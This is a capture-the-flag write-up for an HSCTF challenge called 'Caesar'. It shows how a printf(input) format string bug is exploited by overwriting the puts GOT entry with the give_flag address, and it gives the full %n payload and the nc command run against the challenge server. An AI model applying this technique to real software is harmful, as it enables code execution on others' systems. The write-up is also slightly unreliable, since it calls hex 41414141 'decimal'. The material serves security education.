# Challenge: Caesar

We're given a C program and its resulting ELF binary.

Let's look at the code:


```c
void caesar() {
        int i = 0, shift = 0;
        char input[250];
        char s[100], *p;

        printf("Enter text to be encoded: ");
        fgets(input, 250, stdin);

...

        printf("\nOriginal input:");
        printf(input);
...
}
```

That `printf(input)` is a red flag for a format string attack.
Let's look at the binary with objdump -d:

```
0804886a <give_flag>:
 804886a:   55                      push   %ebp
 804886b:   89 e5                   mov    %esp,%ebp
 804886d:   83 ec 48                sub    $0x48,%esp
 8048870:   83 ec 08                sub    $0x8,%esp
```

Okay, so we have the address to jump to. In little endian systems, that address would be `6a 88 04 08`.

Let's find the offset of our input buffer in the stack. You can do this manually or programatically.

```
...

Thank you for using the Caesar Cipher Encoder! Be sure to like, comment, and subscribe!
Welcome to the Caesar Cipher Encoder!
Enter text to be encoded: Enter number of characters to shift: 
Original input:AAAA: 30: 1
Ciphered with a shift of 0: AAAA: 30: %30$x

Thank you for using the Caesar Cipher Encoder! Be sure to like, comment, and subscribe!
Welcome to the Caesar Cipher Encoder!
Enter text to be encoded: Enter number of characters to shift: 
Original input:AAAA: 31: 41414141
Ciphered with a shift of 0: AAAA: 31: %31$x

Thank you for using the Caesar Cipher Encoder! Be sure to like, comment, and subscribe!
Welcome to the Caesar Cipher Encoder!
Enter text to be encoded: Enter number of characters to shift: 
Original input:AAAA: 32: 3233203a
Ciphered with a shift of 0: AAAA: 32: %32$x

...

```

See that `41414141`? That's the decimal representation of `AAAA`. So, if we put an address to write to in the beginning of the buffer, then we can access it with `%31$x`. Now all we need is the address. We can't use the return pointer - it's location is dynamic. We can't use .fini_array either: the program will crash, as it needs to use that.

Let's run the binary in gdb:

```
    (gdb) disassemble caesar
Dump of assembler code for function caesar:
   0x0804861b <+0>: push   %ebp
   0x0804861c <+1>: mov    %esp,%ebp
   0x0804861e <+3>: sub    $0x178,%esp
   0x08048624 <+9>: movl   $0x0,-0xc(%ebp)
   0x0804862b <+16>:    movl   $0x0,-0x10(%ebp)
   0x08048632 <+23>:    sub    $0xc,%esp
   0x08048635 <+26>:    push   $0x80489d0
   0x0804863a <+31>:    call   0x8048480 <printf@plt>

...

     %eax
   0x08048847 <+556>:   pushl  -0x10(%ebp)
   0x0804884a <+559>:   push   $0x8048a4c
   0x0804884f <+564>:   call   0x8048480 <printf@plt>
   0x08048854 <+569>:   add    $0x10,%esp
   0x08048857 <+572>:   sub    $0xc,%esp
   0x0804885a <+575>:   push   $0x8048a6c
   0x0804885f <+580>:   call   0x80484c0 <puts@plt>
   0x08048864 <+585>:   add    $0x10,%esp
   0x08048867 <+588>:   nop
   0x08048868 <+589>:   leave  
   0x08048869 <+590>:   ret    
End of assembler dump.
```

Did you spot `puts@plt`? It's dynamic linkage, and as it turns out, inside that function, it jumps to an pointer that is allocated with the address of the real `puts` at runtime. If we can find that address, we can hijack this jump.

```
(gdb) stepi
0x0804885f in caesar ()
(gdb) stepi
0x080484c0 in puts@plt ()
(gdb) disassemble
Dump of assembler code for function puts@plt:
=> 0x080484c0 <+0>: jmp    *0x804a020
   0x080484c6 <+6>: push   $0x28
   0x080484cb <+11>:    jmp    0x8048460
End of assembler dump.
```

Found it! The address is is `0804a020`.
Using `%#$n`, we can write the number of bytes that have already been written in the string prior to the address accessed at offset `#`. We can control the number of bytes with `%#$x` where `#` is the number of bytes to write. 

Below is the string, with escaped values, that we will write.

Note that for each byte, if we want to write a value that is smaller than the byte written before, we add more bytes to first overflow modulo 256, then add the number of bytes we actually want.

```
\x20\xa0\x04\x08\x21\xa0\x04\x08\x22\xa0\x04\x08\x23\xa0\x04\x08%90x%31$n%286x%32$n%124x%33$n%260x%34$n
```

The final exploit is seen below:

```
$ ruby -e 'print("\x20\xa0\x04\x08\x21\xa0\x04\x08\x22\xa0\x04\x08\x23\xa0\x04\x08%90x%31$n%286x%32$n%124x%33$n%260x%34$n")' | nc shell.hsctf.com 10003
Welcome to the Caesar Cipher Encoder!
Enter text to be encoded: Enter number of characters to shift: 
Original input: !"#                                                                                        64                                                                                                                                                                                                                                                                                      f77205a0                                                                                                                    f772d470                                                                                                                                                                                                                                                            f774eac4Ciphered with a shift of 0:  !"#%90x%31$n%286x%32$n%124x%33$n%260x%34$nWhy, thank you! 
Thank you for using the Caesar Cipher Encoder! Be sure to like, comment, and subscribe!Here's a flag: flag{printered_lol}
```

